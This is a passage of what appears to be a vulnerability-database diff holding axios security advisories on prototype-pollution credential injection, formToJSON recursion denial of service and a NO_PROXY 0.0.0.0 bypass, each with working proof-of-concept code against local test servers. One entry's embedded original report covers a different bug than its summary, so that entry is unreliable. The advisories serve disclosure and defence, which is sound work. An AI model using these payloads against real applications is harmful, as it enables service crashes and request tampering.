issue:\n\n- Requests with no `auth` property.\n- Requests with no `paramsSerializer` property.\n- Top-level polluted `auth` or `paramsSerializer` values in current hardened versions.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates the top-level merged config with `Object.create(null)`, but nested object cloning still uses ordinary `{}` containers:\n\n```js\n} else if (utils.isPlainObject(source)) {\n  return utils.merge({}, source);\n}\n```\n\nDownstream code then reads nested fields without own-property checks.\n\nIn `lib/helpers/resolveConfig.js`:\n\n```js\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n```\n\nIn `lib/adapters/http.js`:\n\n```js\nconst username = configAuth.username || '';\nconst password = configAuth.password || '';\nauth = username + ':' + password;\n```\n\nIn `lib/helpers/buildURL.js`:\n\n```js\nconst _encode = (options && options.encode) || encode;\nconst serializeFn = _options && _options.serialize;\n```\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst user = 'attacker';\nconst pass = 'exfil';\n\nObject.defineProperty(Object.prototype, 'username', {\n  value: user,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'password', {\n  value: pass,\n  configurable: true\n});\n\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true\n});\n\nconst server = http.createServer((req, res) => {\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify({\n    authorization: req.headers.authorization || null,\n    url: req.url\n  }));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n  const port = server.address().port;\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth \u2014 lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth \u2014 lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads \u2014 lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic \u2026 headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "0.28.0",
+                below: "0.33.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-400",
+                  "CWE-674"
+                ],
+                identifiers: {
+                  summary: "Axios: Excessive recursion in formDataToJSON can cause denial of service",
+                  githubID: "GHSA-42h9-826w-cgv3",
+                  CVE: [
+                    "CVE-2026-67313"
+                  ]
+                },
+                details: "## Summary\nAxios versions `0.28.0` and later contain uncontrolled recursion in `formDataToJSON`, the helper behind the public `axios.formToJSON()` / named `formToJSON` API and the default request transform used when FormData is sent with an `application/json` content type.\n\nApplications are affected when they pass attacker-controlled `FormData` field names into this functionality. A field name with thousands of nested bracket segments can exhaust the JavaScript call stack and throw `RangeError: Maximum call stack size exceeded`, causing request failure and, in applications that do not handle the exception or rejected promise, possible process termination.\n\n## Impact\nThe impact is denial of service against applications that process untrusted `FormData` field names through axios' FormData-to-JSON conversion.\n\nThe vulnerable path is not reached by merely installing axios, by normal multipart `FormData` pass-through, or by ordinary axios requests that do not request JSON serialisation of `FormData`. In the default axios request, the error is produced before network I/O and returned as a rejected Promise. Direct use of `formToJSON()` throws synchronously.\n\nServer-side applications are the primary risk when remote users can submit arbitrary form field names, and the application converts those fields with `formToJSON()` or sends them through axios as JSON.\n\n## Affected Functionality\nAffected APIs and paths:\n- `axios.formToJSON(formData)`\n- `import { formToJSON } from \"axios\"`\n- `lib/helpers/formDataToJSON.js`\n- axios default `transformRequest` when `data` is `FormData` and `Content-Type` contains `application/json`\n\nUnaffected or lower-risk paths:\n- Normal multipart `FormData` requests without `JSON Content-Type`\n- `toFormData()` object-to-FormData serialisation, which already has a `maxDepth` guard\n- Axios versions before 0.28.0, where this helper and public API were not present\n\n## Technical Details\n`lib/helpers/formDataToJSON.js` parses a form field name into path segments with `parsePropPath()`. For a key such as `a[x][x][x]`, each bracketed segment becomes another path element.\n\n`formDataToJSON()` then calls the nested `buildPath(path, value, target, index)` function. `buildPath()` recursively calls itself once for each path segment and does not enforce a maximum depth:\n\n`const result = buildPath(path, value, target[name], index);`\n\nA key containing thousands of bracket segments, therefore, creates thousands of recursive calls. At sufficient depth, V8 throws `RangeError: Maximum call stack size exceeded`.\n\nAxios already applies a depth guard to the inverse serializer in `lib/helpers/toFormData.js`, where `maxDepth` defaults to 100 and exceeding it throws `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED`. `formDataToJSON()` does not currently have equivalent protection.\n\n## Proof of Concept of Attack\n```js\nimport { formToJSON } from \"axios\";\n\nconst fd = new FormData();\nfd.append(\"a\" + \"[x]\".repeat(15000), \"value\");\n\ntry {\n  formToJSON(fd);\n  console.log(\"not vulnerable\");\n} catch (err) {\n  console.log(`${err.constructor.name}: ${err.message}`);\n}\n```\n\nExpected vulnerable result:\n\nRangeError: Maximum call stack size exceeded\n\nThe axios request transform path can also be reached before network I/O:\n\n```js\nimport axios from \"axios\";\n\nconst fd = new FormData();\nfd.append(\"a\" + \"[x]\".repeat(15000), \"value\");\n\nawait axios\n  .post(\"http://127.0.0.1:1/\", fd, {\n    headers: { \"Content-Type\": \"application/json\" }\n  })\n  .catch((err) => console.log(`${err.constructor.name}: ${err.message}`));\n```\n\nExpected vulnerable result:\n\nRangeError: Maximum call stack size exceeded\n\n## Workarounds\nApplications can avoid the vulnerable path by not converting attacker-controlled `FormData` to JSON with axios.\n\nIf conversion is required before a fixed axios release is available, validate `FormData` field names before calling `formToJSON()` or before sending `FormData` with `Content-Type: application/json`. Reject keys whose parsed nesting depth exceeds the application's expected schema.\n\nFor axios requests carrying untrusted `FormData`, avoid setting `Content-Type: application/json`; leaving the data as multipart FormData bypasses `formDataToJSON()`.\n\nCatching the resulting error can prevent process termination, but it does not remove the uncontrolled-recursion behaviour and should not be treated as the primary mitigation.\n\n<details>\n<summary>Original Report</summary>\n# Axios SSRF via Incomplete Loopback Detection\n## CWE-918 | CVSS 7.5 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\n\n---\n\n## 1. Classification\n\n| CWE | CVSS Score | Severity | Type |\n|-----|-----------|----------|------|\n| CWE-918 | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L) | HIGH | Server-Side Request Forgery |\n\n## 2. Description\n\n### Summary\nThe `shouldBypassProxy()` function in Axios fails to recognise `0.0.0.0`, `::`, and `::ffff:0.0.0.0` as loopback addresses. When `NO_PROXY=localhost` is configured, requests to these addresses are incorrectly forwarded through the proxy instead of being sent directly, enabling an SSRF attack against internal services reachable via the proxy's loopback interface.\n\n### Root Cause\n**File:** `lib/helpers/shouldBypassProxy.js`\n\n**`isIPv4Loopback` (lines 3-8):** Only checks for `127.x.x.x` addresses by inspecting `parts[0] !== '127'`. The `0.0.0.0` address has `parts[0] === '0'`, so it falls through as non-loopback, even though on Linux `0.0.0.0` routes to the loopback interface.\n\n**`isIPv6Loopback` (lines 10-38):** Only checks `host === '::1'`. The `::` address (unspecified IPv6) also routes to the loopback, but is not recognised.\n\n**Attack Flow:**\n```\nisIPv4Loopback (line 3) \u2014 fails for 0.0.0.0\n  \u2192 isLoopback (line 44) \u2014 wraps both checks, returns false\n    \u2192 shouldBypassProxy (line 127) \u2014 PUBLIC API, exported default\n      \u2192 lib/adapters/http.js (line 190) \u2014 Node.js HTTP adapter\n```\n\n### Attack Vector\n- **Access Vector:** Network (AV:N)\n- **Access Complexity:** Low (AC:L) \u2014 attacker only needs control of a URL\n- **Privileges Required:** None (PR:N)\n- **User Interaction:** None (UI:N)\n\n## 3. Proof of Concept\n\n### Phase 1: Logic Verification\n\n```javascript\nimport shouldBypassProxy from 'axios/lib/helpers/shouldBypassProxy.js';\n\n// Normal loopback \u2014 correctly returns true (bypasses proxy)\nshouldBypassProxy('http://127.0.0.1:9999/');  // \u2192 true\n\n// Vulnerable \u2014 returns false (goes through proxy!)\nshouldBypassProxy('http://0.0.0.0:9999/');    // \u2192 false  \u2190 SSRF\nshouldBypassProxy('http://[::]:9999/');        // \u2192 false  \u2190 SSRF\nshouldBypassProxy('http://[::ffff:0.0.0.0]:9999/'); // \u2192 false \u2190 SSRF\n```\n\n### Phase 2: Docker E2E Reproduction\n\nA full 3-container Docker reproduction was created and tested:\n\n- **Proxy container:** Simple HTTP forward proxy on port 8888\n- **Internal container:** Internal service on port 9999 (simulates sensitive internal resource)\n- **Attacker container:** Runs the test script with Axios source mounted\n\n**Reproduction steps:**\n```bash\ncd /tmp/deep-e2e\ndocker compose up -d\ndocker compose exec attacker node test-ssrf.js\n```\n\n**Results:**\n- Test 1: `127.0.0.1 + NO_PROXY=localhost` \u2192 BYPASS (correct) \n- Test 2: `0.0.0.0 + NO_PROXY=localhost` \u2192 VIA_PROXY (SSRF) \n- Test 3: `[::] + NO_PROXY=localhost` \u2192 VIA_PROXY (SSRF) \n- Test 4: `[::ffff:0.0.0.0] + NO_PROXY=localhost` \u2192 VIA_PROXY (SSRF) \n\n### Phase 3: Actual Axios Client\n\nThe real Axios HTTP client (v1.16.1, source tree) was tested through proxy configuration:\n- Axios with `proxy: { host: 'proxy', port: 8888 }` \n- Setting `NO_PROXY=localhost` and requesting `http://0.0.0.0:9999/`\n- Result: Axios forwarded the request through the proxy instead of bypassing it\n\n## 4. Impact\n\n### Attack Scenario\n1. Attacker has control over a URL that an Axios client will request (direct input, redirect target, open redirect chain)\n2. The Axios client is configured with a proxy (e.g., corporate proxy) and `NO_PROXY=localhost` to protect internal services\n3. Attacker supplies `http://0.0.0.0:8080/admin` as the target URL\n4. Axios sends the request through the proxy\n5. The proxy resolves `0.0.0.0` \u2192 the proxy's own loopback \u2192 reaches the internal admin service on port 8080\n\n### Potential Consequences\n- **Information disclosure (C:L):** Internal service responses become accessible\n- **Integrity impact (I:L):** Attacker can trigger actions on internal services (if proxy supports PUT/POST/DELETE)\n- **Availability impact (A:L):** Limited \u2014 depends on internal service behavior\n\n### Likelihood\n- **High** \u2014 proxy bypass is a common pattern in microservice architectures\n- **Medium** \u2014 requires attacker control of a URL (not always available)\n\n## 5. Remediation\n\n### Code Fix\n\n**File:** `lib/helpers/shouldBypassProxy.js`\n\n```javascript\nfunction isIPv4Loopback(host) {\n  if (host === '0.0.0.0') return true;  // ADD THIS LINE\n  const parts = host.split('.');\n  if (parts.length !== 4) return false;\n  if (parts[0] !== '127') return false;\n  return parts.every(p => /^\\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255);\n}\n\nfunction isIPv6Loopback(host) {\n  if (host === '::1' || host === '::') return true;  // ADD '::'\n  // ... rest of implementation\n}\n```\n\n### Workarounds\n- Add `0.0.0.0` and `::` to the `NO_PROXY` environment variable explicitly\n- Use `127.0.0.1` instead of `0.0.0.0` in all internal service URLs\n- Implement URL validation to reject `0.0.0.0` and `::` before passing to Axios",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-42h9-826w-cgv3",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "0.28.0",
+                below: "0.33.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-400",
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "Axios: Deep formToJSON Key Recursion Can Cause Denial of Service",
+                  githubID: "GHSA-pmv8-rq9r-6j72",
+                  CVE: [
+                    "CVE-2026-67312"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions starting with `0.28.0` contain uncontrolled recursion in `formDataToJSON`, which is exposed as `axios.formToJSON()` and used internally when axios serialises `FormData` with `Content-Type: application/json`.\n\nIf an application passes attacker-controlled `FormData` field names to this functionality, a field name with thousands of nested bracket segments can exhaust the JavaScript call stack and cause denial of service for that request or, in applications without appropriate error handling, process termination.\n\n## Impact\n\nApplications are affected only when untrusted users can control `FormData` key names that are converted through axios.\n\nAffected paths include direct use of `axios.formToJSON()` on untrusted `FormData` and axios requests in which attacker-controlled `FormData` is sent with `Content-Type: application/json`.\n\nThe observed failure is `RangeError: Maximum call stack size exceeded`. In local testing, this error is catchable, so process-wide crash depends on the consuming application's error handling and runtime behaviour.\n\n## Affected Functionality\n\nAffected functionality:\n- `axios.formToJSON(formData)`\n- Named ESM export `formToJSON`\n- Default `transformRequest` behaviour for `FormData` when `Content-Type` contains `application/json`\n\nUnaffected functionality:\n- Normal multipart `FormData` submission without JSON serialisation\n- `toFormData`, which already enforces a `maxDepth` guard\n- Axios versions `<=0.27.2`, where `formDataToJSON` was not present\n\n## Technical Details\n\nThe vulnerable code is in `lib/helpers/formDataToJSON.js`.\n\n`parsePropPath()` splits a field name such as `a[x][x][x]` into path segments. `buildPath()` then recursively processes one segment per call without enforcing a maximum depth:\n\n```js\nconst result = buildPath(path, value, target[name], index);\n```\n\nA key with thousands of bracket-delimited segments causes thousands of recursive calls and can exceed the JavaScript engine's call stack limit.\n\nRelevant source locations:\n- `lib/helpers/formDataToJSON.js` contains the unbounded recursive `buildPath()`.\n- `lib/axios.js` exposes the helper as `axios.formToJSON`.\n- `index.js` exposes `formToJSON` as a named export.\n- `index.d.ts` and `index.d.cts` declare the public API.\n- `lib/defaults/index.js` calls `formDataToJSON(data)` when JSON-serializing `FormData`.\n\nThe inverse helper, `toFormData`, already enforces `maxDepth` and throws `AxiosError` with `ERR_FORM_DATA_DEPTH_EXCEEDED`, but `formDataToJSON` does not have an equivalent guard.\n\n## Proof of Concept of Attack\n\n```js\nimport axios from 'axios';\n\nconst fd = new FormData();\nfd.append('a' + '[x]'.repeat(15000), 'value');\n\ntry {\n  axios.formToJSON(fd);\n  console.log('not vulnerable');\n} catch (e) {\n  console.log(`${e.constructor.name}: ${e.message}`);\n}\n```\n\nExpected result on affected versions:\n\nRangeError: Maximum call stack size exceeded\n\nThe same condition can be reached via an axios request transformation when attacker-controlled `FormData` is sent with `Content-Type: application/json`.\n\n## Workarounds\nApplications can reject or normalise untrusted form field names before calling `axios.formToJSON()`.\n\nApplications can avoid sending untrusted `FormData` through axios as JSON unless JSON conversion is required.\n\nApplications should catch errors around `formToJSON()` or axios requests that transform untrusted `FormData`.\n\n<details>\n<summary>Original Source</summary>\n\n### Summary\nAn uncontrolled recursion vulnerability in `formDataToJSON` allows any user who controls FormData input to crash a Node.js process with a single request. The function recurses once per bracket-delimited segment in a FormData key name with no depth limit, so a key like `a[x][x][x]...` with 15,000+ segments exhausts the call stack. This is a denial-of-service that kills the process via an unrecoverable `RangeError`. The inverse function `toFormData` already enforces a `maxDepth` limit (default 100) for exactly this reason \u2014 `formDataToJSON` lacks the equivalent guard.\n\n### Details\n**Vulnerable function:** `buildPath` in `lib/helpers/formDataToJSON.js`, lines 50\u201382.\n\n`buildPath(path, value, target, index)` is called recursively \u2014 once per segment in the parsed property path \u2014 with no depth check:\n\n```javascript\n// lib/helpers/formDataToJSON.js, lines 50\u201382\nfunction buildPath(path, value, target, index) {\n  let name = path[index++];              // advance one level\n  if (name === '__proto__') return true;\n  // ...\n  if (!isLast) {\n    // ...\n    const result = buildPath(path, value, target[name], index);  // recurse \u2014 NO depth guard\n    // ...\n  }\n}\n```\n\nThe key is first split into segments by `parsePropPath` (line 17), which extracts every `[segment]` via regex. A key with 15,000 bracket pairs produces a 15,001-element array, causing 15,001 recursive calls \u2014 well beyond the V8 default stack limit (~10,000\u201315,000 frames).\n\n**`formDataToJSON` is a public API** consumed two ways:\n\n1. **Directly by consumers** \u2014 exported as `axios.formToJSON()` (`lib/axios.js:80`), with TypeScript declarations in both `index.d.ts:699` and `index.d.cts:708`, and documented in the API reference in four languages (`docs/pages/advanced/api-reference.md`).\n\n2. **Internally by `transformRequest`** \u2014 called at `lib/defaults/index.js:56` when the request body is `FormData` and `Content-Type` contains `application/json`:\n   ```javascript\n   return hasJSONContentType ? JSON.stringify(formDataToJSON(data)) : data;\n   ```\n\n**Contrast with `toFormData`:** The inverse function (`lib/helpers/toFormData.js:118`) enforces `maxDepth` (default 100) and throws `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED` when exceeded. `formDataToJSON` has no equivalent protection.\n\n### PoC\nRequires only Node.js and an unmodified axios v1.x install:\n\n```javascript\nimport formDataToJSON from 'axios/lib/helpers/formDataToJSON.js';\n\n// Build a FormData with a single key containing 15,000 nested bracket segments\nconst fd = new FormData();\nconst key = \"a\" + \"[x]\".repeat(15000);\nfd.append(key, \"value\");\n\ntry {\n  formDataToJSON(fd);\n  console.log(\"Not vulnerable\");\n} catch (e) {\n  console.log(e.constructor.name + \": \" + e.message);\n  // RangeError: Maximum call stack size exceeded\n}\n```\n\nVerified output on Node.js 22.22.3 against axios v1.16.1 (current `v1.x` HEAD):\n\n```\nRangeError: Maximum call stack size exceeded\n```\n\nThe process crashes. In a server context (e.g., Express middleware calling `axios.formToJSON()` on an uploaded form), a single crafted request terminates the process.\n\n### Impact\n**Denial of Service (process crash).** Any unauthenticated user who can submit FormData to a Node.js application that passes it through `axios.formToJSON()` \u2014 or that sends it as a JSON-serialized FormData body via axios \u2014 can crash the server process with a single request. The `RangeError` from stack exhaustion is unrecoverable in many contexts (it cannot be reliably caught when the stack is already full). No authentication or special privileges are required; the attacker only needs to control a FormData key name.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-pmv8-rq9r-6j72",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "0.31.0",
+                below: "0.33.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-183",
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "Axios: NO_PROXY bypass for 0.0.0.0 local addresses in axios",
+                  githubID: "GHSA-f4gw-2p7v-4548",
+                  CVE: [
+                    "CVE-2026-67315"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions containing `lib/helpers/shouldBypassProxy.js` do not treat `0.0.0.0` as a local address when evaluating `NO_PROXY` rules. In Node.js applications that use `HTTP_PROXY` or `HTTPS_PROXY` together with `NO_PROXY=localhost,127.0.0.1,::1` or similar, a request to `http://0.0.0.0:<port>/` can be routed through the configured proxy instead of bypassing it.\n\nThe issue is exploitable when an attacker can influence the axios request URL or a followed redirect target, and when the proxy can reach or relay `0.0.0.0` to local services. This is a Node.js runtime proxy-routing issue, not a browser, install-time, or development-tooling issue.\n\n## Impact\n\nApplications are affected when all of the following are true:\n\n- The application runs axios in Node.js with the HTTP adapter.\n- The process uses environment proxy variables such as `HTTP_PROXY` or `HTTPS_PROXY`.\n- The process uses `NO_PROXY` entries such as `localhost`, `127.0.0.1`, or `::1` to keep local traffic out of the proxy path.\n- Attacker-controlled input can influence the request URL or redirect target.\n- The configured proxy does not reject `0.0.0.0` and can reach the local destination.\n\nFor plain HTTP targets, the proxy can receive the full request URL, headers, and body, and may be able to observe the local service response. HTTPS targets are less exposed because axios uses CONNECT tunneling in current versions.\n\n## Affected Functionality\n\nAffected functionality is limited to environment-derived proxy selection in the Node HTTP adapter:\n\n- `lib/adapters/http.js` calls `getProxyForUrl(location)` and then `shouldBypassProxy(location)` before applying the proxy.\n- `lib/helpers/shouldBypassProxy.js` normalizes and compares `NO_PROXY` entries.\n- Explicit caller-provided `config.proxy` remains trusted caller configuration.\n- Browser, React Native, XHR, and fetch adapter behavior are not affected.\n\n## Technical Details\n\n`lib/helpers/shouldBypassProxy.js` defines local loopback equivalence through `isLoopback()`. The current implementation recognizes `localhost`, IPv4 `127.0.0.0/8`, IPv6 `::1`, and IPv4-mapped loopback forms, but it does not include `0.0.0.0`.\n\nAt `lib/helpers/shouldBypassProxy.js:176`, axios treats two hosts as matching when both are considered loopback:\n\n```js\nreturn hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));\n```\n\nBecause `isLoopback('0.0.0.0')` returns `false`, `NO_PROXY=localhost,127.0.0.1,::1` does not match `http://0.0.0.0:<port>/`. `lib/adapters/http.js:185-193` then applies the environment proxy.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from './index.js';\n\nconst listen = (handler, host = '127.0.0.1') =>\n  new Promise((resolve) => {\n    const server = http.createServer(handler);\n    server.listen(0, host, () => resolve(server));\n  });\n\nconst close = (server) => new Promise((resolve) => server.close(resolve));\n\nconst origin = await listen((req, res) => res.end('origin'), '0.0.0.0');\n\nlet proxyRequests = 0;\nconst proxy = await listen((req, res) => {\n  proxyRequests += 1;\n  res.end('proxied');\n});\n\nprocess.env.http_proxy = `http://127.0.0.1:${proxy.address().port}`;\nprocess.env.HTTP_PROXY = process.env.http_proxy;\nprocess.env.no_proxy = 'localhost,127.0.0.1,::1';\nprocess.env.NO_PROXY = process.env.no_proxy;\n\ntry {\n  const direct = await axios.get(`http://127.0.0.1:${origin.address().port}/`);\n  const zero = await axios.get(`http://0.0.0.0:${origin.address().port}/`);\n\n  console.log({ direct: direct.data, zero: zero.data, proxyRequests });\n} finally {\n  await close(origin);\n  await close(proxy);\n}\n```\n\nExpected safe behavior: both `127.0.0.1` and `0.0.0.0` bypass the proxy when the `NO_PROXY` policy is intended to cover local destinations.\n\nObserved behavior: `127.0.0.1` bypasses the proxy, while `0.0.0.0` is sent through the proxy.\n\n## Workarounds\n\n- Add `0.0.0.0` explicitly to `NO_PROXY` where local addresses must bypass proxies.\n- Reject or normalize `0.0.0.0` in application URL validation before calling axios.\n- Set `proxy: false` on axios requests that must never use environment proxies.\n- Configure the proxy itself to reject `0.0.0.0`, loopback, link-local, and internal address ranges.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n`axios` versions 1.15.0\u20131.16.1 contain an incomplete loopback-address check in `lib/helpers/shouldBypassProxy.js`. The `isLoopback()` function correctly identifies `127.0.0.0/8` and `::1` as loopback addresses but does not recognise `0.0.0.0` \u2014 the IPv4 unspecified address, which routes to the local machine on Linux and macOS.\n\nAn attacker who controls a URL passed to axios can use `http://0.0.0.0/<path>` to bypass proxy-based SSRF filtering that the application relies upon.\n\n### Details\n## Affected versions\n\n`>= 1.15.0, <= 1.16.1`\n\nThe vulnerability was introduced in v1.15.0 when the `shouldBypassProxy` helper was added as a security improvement (PR #10661).\n\n---\n\n## Root cause\n\n**File:** `lib/helpers/shouldBypassProxy.js`\n\n```javascript\n// Line 1 \u2014 static allowlist (incomplete)\nconst LOOPBACK_HOSTNAMES = new Set(['localhost']);   // \u2190 0.0.0.0 missing\n\nconst isIPv4Loopback = (host) => {\n  const parts = host.split('.');\n  if (parts.length !== 4) return false;\n  if (parts[0] !== '127') return false;   // \u2190 0.0.0.0: parts[0] = '0' \u2192 false\n  return parts.every((p) => /^\\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255);\n};\n\nconst isLoopback = (host) => {\n  if (!host) return false;\n  if (LOOPBACK_HOSTNAMES.has(host)) return true;   // \u2190 '0.0.0.0' not in set\n  if (isIPv4Loopback(host)) return true;           // \u2190 returns false for 0.0.0.0\n  return isIPv6Loopback(host);\n};\n\nisLoopback('0.0.0.0') returns false.\n\nNode's WHATWG URL parser does not normalise 0.0.0.0 to 127.0.0.1. Other bypass forms are safe: new URL('http://0177.0.0.1/').hostname \u2192 '127.0.0.1' (octal), new URL('http://2130706433/').hostname \u2192 